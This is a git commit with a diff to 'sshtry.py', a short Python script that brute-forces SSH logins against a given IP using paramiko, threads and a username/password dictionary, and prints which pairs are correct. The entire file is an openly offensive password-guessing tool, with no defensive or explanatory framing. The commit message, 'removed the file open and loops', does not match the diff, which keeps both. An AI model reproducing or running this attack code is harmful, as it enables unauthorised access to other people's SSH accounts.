821fd72ec0de9126424a744cec8ec0437fbd2b22
shadowninja826 <sodachheng@gmail.com>
2016-12-20 07:57:38 -0600

    removed the file open and loops

--- sshtry.py
+++ sshtry.py
@@ -1,13 +1,15 @@
 
 import paramiko, sys, time, threading
 
+
 if len(sys.argv) < 3:
     print "Usage: %s IP /path/to/dictionary" % (str(sys.argv[0]))
     print "Example: %s 192.168.150.1 dict.txt" % (str(sys.argv[0]))
-    print "Dictionary should be in user pass [space] format"
+    print "Dictionary should be in user pass format"
     sys.exit(1)
 
-ip=sys.argv[1]; filename=sys.argv[2]
+ip=sys.argv[1]
+filename=sys.argv[2]
 
 fd = open("pass.txt", "r")
 
@@ -17,18 +19,19 @@ def attempt(IP,UserName,Password):
     try:
         ssh.connect(IP, username=UserName, password=Password)
     except paramiko.AuthenticationException:
-        print '[-] %s:%s fail!' % (UserName, Password)
+        print IP + ' [-] %s:%s fail!' % (UserName, Password)
     else:
-        print '[!] %s:%s is CORRECT!' % (UserName, Password)
-    ssh.close()
-    return
-
+        print IP + '[!] %s:%s is CORRECT!' % (UserName, Password)
+        ssh.close()
+        return
 print '[+] Bruteforcing against %s with dictionary %s' % (ip, filename)
 for line in fd.readlines():
     username, password = line.strip().split(" ")
+    attempt(ip,username,password)
     t = threading.Thread(target=attempt, args=(ip,username,password))
     t.start()
-    time.sleep(0.3)
+    time.sleep(.4)
 
 fd.close()
 sys.exit(0)
+
